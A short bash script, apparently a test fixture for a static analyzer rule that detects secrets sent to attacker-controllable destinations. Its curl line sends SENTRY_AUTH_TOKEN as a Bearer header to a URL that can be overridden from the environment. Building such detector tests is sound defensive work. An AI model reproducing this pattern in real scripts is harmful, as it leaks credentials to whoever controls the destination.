#!/usr/bin/env bash
set -uo pipefail

case "$-" in
  *x*)
    if [ -n "${SENTRY_AUTH_TOKEN:+x}" ]; then
      printf "[FATAL] refusing to trace with SENTRY_AUTH_TOKEN set (#7797)\n" >&2
      exit 78
    fi
    ;;
esac

# Rule D, destination limb, with the bearer fed through process substitution:
# the token feed must not be mistaken for the destination, AND a genuinely
# env-settable, never-compared $SINK_URL must still be reported.
SINK_URL="${FIXTURE_SINK_URL:-https://example.invalid/ingest}"
curl --disable --noproxy '*' -sS --max-time 20 --config - "$SINK_URL" < <(printf 'header = "Authorization: Bearer %s"\n' "$SENTRY_AUTH_TOKEN") || true
